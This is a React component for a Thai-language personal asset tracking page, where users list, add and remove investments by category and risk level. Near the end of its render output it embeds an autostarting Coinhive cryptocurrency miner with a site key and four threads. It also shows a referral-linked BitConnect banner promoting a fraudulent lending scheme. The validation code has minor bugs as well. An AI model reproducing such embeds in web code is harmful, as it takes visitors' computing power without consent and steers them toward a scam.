"use strict"
import React from 'react'
import {connect} from 'react-redux';
import {bindActionCreators} from 'redux';
import {findDOMNode} from 'react-dom';

import {
  Table,
  FormControl,
  FormGroup,
  MenuItem,
  InputGroup,
  DropdownButton,
  ButtonGroup,
  Button,
  Image,
  Grid,
  Row,
  Col
} from 'react-bootstrap';

import {getAsset, createAsset, removeAsset} from '../../actions/assetAction';
import {getMemberSession} from '../../actions/memberAction';

var NumberFormat = require('react-number-format');

class Asset extends React.Component {

  constructor(props) {
    super(props);
    this.state = {
      myasset: {
        newRecord: {
          catagory: null,
          catagory_display: 'ประเภท',
          risk_level: 0,
          risk_display: 'ความเสี่ยง',
          invest_amount: 0,
          description: null
        }
      }
    }
  }

  componentDidMount() {
    this.props.getMyAsset(function() {}); //
    this.props.getMemberSession();
  }

  componentDidUpdate() {
    let myMemberMessage = this.props.member.mymember.message;
    if (myMemberMessage == 'no session' || myMemberMessage == null) {
      this.handlerRedirect('signin')
    }
  }

  handlerRedirect(path) {
    switch (path) {
      case 'signin':
        this.props.router.push('/signin');
        break;
      default:
    }
  }

  resetNewRecord() {
    this.setState({
      myasset: {
        newRecord: {
          catagory: null,
          catagory_display: 'ประเภท',
          risk_level: 0,
          risk_display: 'ความเสี่ยง',
          invest_amount: 0,
          description: null
        }
      }
    })
  }

  handlerCreateAsset() {

    let contex = this;
    let newCatagory = this.state.myasset.newRecord.catagory;
    let newRiskLevel = this.state.myasset.newRecord.risk_level;
    let newDescription = findDOMNode(this.refs.newDescription).value;
    let newAmount = parseInt(findDOMNode(this.refs.newAmount).value);
    if (newCatagory == null | newRiskLevel == 0 | newDescription == '' | isNaN(newAmount)) {
      return 0;
    }
    // build new record
    const newRecord = {
      catagory: newCatagory,
      risk_level: newRiskLevel,
      invest_amount: newAmount,
      description: newDescription
    }
    // reformat number to positive
    if (newRecord.amount < 0) {
      newRecord.amount = newRecord.amount * -1;
    }

    this.props.createAsset(newRecord.catagory, newRecord.risk_level, newRecord.description, newRecord.invest_amount, function() {
      contex.resetNewRecord();
    });
  }

  handlerRemoveAsset(_asset) {
    this.props.deleteAsset(_asset, function() {});
  }

  handlerUpdateCatagorySelected(_catagory, _display) {
    this.setState({
      myasset: {
        newRecord: {
          catagory: _catagory,
          catagory_display: _display,
          risk_level: this.state.myasset.newRecord.risk_level,
          risk_display: this.state.myasset.newRecord.risk_display,
          invest_amount: this.state.myasset.newRecord.invest_amount,
          description: this.state.myasset.newRecord.description
        }
      }
    })
  }

  handlerUpdateRiskSelected(_level, _display) {
    this.setState({
      myasset: {
        newRecord: {
          catagory: this.state.myasset.newRecord.catagory,
          catagory_display: this.state.myasset.newRecord.catagory_display,
          risk_level: _level,
          risk_display: _display,
          invest_amount: this.state.myasset.newRecord.invest_amount,
          description: this.state.myasset.newRecord.description
        }
      }
    })
  }

  render() {

    const assetItems = this.props.myasset.map(function(item, i) {

      let catagory_display = '';
      let risk_display = '';

      switch (item.risk_level) {
        case 1:
          risk_display = 'ต่ำ'
          break;
        case 2:
          risk_display = 'กลาง'
          break;
        case 3:
          risk_display = 'สูง'
          break;
        default:
          risk_display = null
          break;
      }

      switch (item.catagory) {
        case 'A000001':
          catagory_display = 'อสังหา'
          break;
        case 'B000001':
          catagory_display = 'เงินดิจิตอล'
          break;
        case 'C000001':
          catagory_display = 'สลากรัฐ'
          break;
        default:
          catagory_display = null
          break;
      }

      return (
        <tr key={i}>
          <td>{catagory_display}</td>
          <td>{risk_display}</td>
          <td>{item.description}</td>
          <td>
            <b>
              <NumberFormat thousandSeparator={true} prefix={'฿ '} value={item.invest_amount} displayType={'text'}/>
            </b>
          </td>
          <td>
            <Button onClick={this.handlerRemoveAsset.bind(this, item)} block>ลบ</Button>
          </td>
        </tr>
      )
    }, this)

    const assetCatagory = [
      {
        catagory: 'A000001',
        catagory_display: 'อสังหา'
      }, {
        catagory: 'B000001',
        catagory_display: 'เงินดิจิตอล'
      }, {
        catagory: 'C000001',
        catagory_display: 'สลากรัฐ'
      }
    ].map(function(item, i) {
      return (
        <MenuItem key={i} eventKey={item.catagory} style={{
          backgroundColor: '#222222'
        }} onClick={this.handlerUpdateCatagorySelected.bind(this, item.catagory, item.catagory_display)}>{item.catagory_display}</MenuItem>
      )
    }, this)

    const assetRiskLevel = [
      {
        risk_level: 1,
        risk_display: 'ต่ำ'
      }, {
        risk_level: 2,
        risk_display: 'กลาง'
      }, {
        risk_level: 3,
        risk_display: 'สูง'
      }
    ].map(function(item, i) {
      return (
        <MenuItem key={i} eventKey={item.risk_level} style={{
          backgroundColor: '#222222'
        }} onClick={this.handlerUpdateRiskSelected.bind(this, item.risk_level, item.risk_display)}>{item.risk_display}</MenuItem>
      )
    }, this)

    return (
      <Grid>
        <h3>ทรัพย์สิน</h3>
        <Table striped bordered condensed hover style={{
          color: 'black'
        }}>
          <thead>
            <tr>
              <th>#ประเภท</th>
              <th>ความเสี่ยง</th>
              <th>สินทรัพย์</th>
              <th>ทุน</th>
              <th>จัดการ</th>
            </tr>
          </thead>
          <tbody>
            {assetItems}
            <tr>
              <td>
                <InputGroup >
                  <DropdownButton componentClass={InputGroup.Button} id="input-dropdown-addon" title={this.state.myasset.newRecord.catagory_display} bsStyle="default">
                    {assetCatagory}
                  </DropdownButton>
                </InputGroup>
              </td>
              <td>
                <InputGroup >
                  <DropdownButton componentClass={InputGroup.Button} id="input-dropdown-addon" title={this.state.myasset.newRecord.risk_display} bsStyle="default">
                    {assetRiskLevel}
                  </DropdownButton>
                </InputGroup>
              </td>
              <td><FormControl type="text" placeholder="ชื่อสินทรัพย์" ref="newDescription"/></td>
              <td>
                <FormGroup>
                  <InputGroup>
                    <InputGroup.Addon>฿</InputGroup.Addon>
                    <FormControl min="0" type="number" placeholder="จำนวนทุน" ref="newAmount"/>
                  </InputGroup>
                </FormGroup>
              </td>
              <td>
                <Button onClick={this.handlerCreateAsset.bind(this)} bsStyle="success">เพิ่ม</Button>
              </td>
            </tr>
          </tbody>
        </Table>
        <div className="coinhive-miner" style={{
          "width": "100%",
          "height": "94px"
        }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1"></div>
        <br/>
        <a href="https://bitconnect.co/?ref=supanat">
          <div style={{
            'textAlign': 'center',
            'background': 'black'
          }}>
            <Image responsive bsClass='img-responsive center-block' src="https://bitconnect.co/upload/image/banner/lending/BitConnect-lending-728X90.gif"/>
          </div>
        </a>
      </Grid>
    )
  }
}

function mapStateToProps(state) {
  return {myasset: state.asset.myasset, member: state.member}
  // / * TODO : Template Active - map state to prop totalQty : state.cart.totalQty * /
}
function mapDispatchToProps(dispatch) {

  // / * TODO : Template Active - map dispatch to prop getCart : getCart * /
  return bindActionCreators({
    getMemberSession: getMemberSession,
    getMyAsset: getAsset,
    createAsset: createAsset,
    deleteAsset: removeAsset
  }, dispatch)
}
export default connect(mapStateToProps, mapDispatchToProps)(Asset);
